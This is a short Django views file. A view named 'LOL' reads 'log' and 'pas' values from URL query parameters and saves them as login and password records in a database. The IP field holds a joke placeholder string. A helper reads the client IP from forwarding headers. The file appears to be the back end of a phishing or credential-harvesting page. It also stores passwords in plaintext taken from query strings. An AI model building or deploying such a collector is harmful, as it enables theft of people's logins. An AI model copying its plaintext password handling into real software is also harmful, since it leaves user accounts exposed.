from django.shortcuts import render
from django.http import HttpRequest
from .models import UserData, GuestData
from django.utils import timezone
def get_ip(request):
	x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
	if x_forwarded_for:
		ip = x_forwarded_for.split(',')[0]
	else:
		ip = request.META.get('REMOTE_ADDR')
	return ip


def LOL(request):
	login = ''
	password = ''

	if request.GET['log']:
		login = request.GET['log']
	if request.GET['pas']:
		password = request.GET['pas']
	if login and password:
		UserData.objects.create(login=login, password=password, ip='hz kak zapilit')

	return render(request, 'blog/blank.html', {'data': [request.GET, get_ip(request)]})

